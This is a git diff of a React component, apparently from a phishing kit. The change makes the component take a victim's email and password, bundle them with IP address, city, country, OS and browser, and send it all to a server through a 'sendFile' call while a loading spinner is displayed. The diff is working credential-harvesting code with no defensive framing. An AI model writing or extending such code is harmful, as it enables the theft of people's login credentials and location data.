@@ -1,27 +1,50 @@
 import React from "react";
 import { useEffect } from "react";
-import { getIP } from "./servers";
+import { getIP, sendFile } from "./servers";
 import { browserName, osName } from "react-device-detect";
+import "./loaderstyle.css";
 
-function GetLocationInfo() {
+function GetLocationInfo({ email, pass, reportbox }) {
   useEffect(() => {
     getIP().then((res) => {
       const ip = res.data.ip;
       const date = new Date().toLocaleString();
 
       const data = {
+        email: email,
+        password: pass,
         ip: res.data.ip,
         city: res.data.city,
         country: res.data.country_name,
         osName: osName,
-        browserNamE: browserName,
+        browser: browserName,
         date: date,
+        reportbox: reportbox,
       };
 
-      console.log(data);
+      sendFile(data).then((res) => {
+        console.log(`Status: ${res.status} \n data: ${data}`);
+      });
     });
   });
-  return <></>;
+  return (
+    <div style={{ display: "flex", justifyContent: "center", marginTop: 50 }}>
+      <div className="lds-default">
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+      </div>
+    </div>
+  );
 }
 
 export default GetLocationInfo;
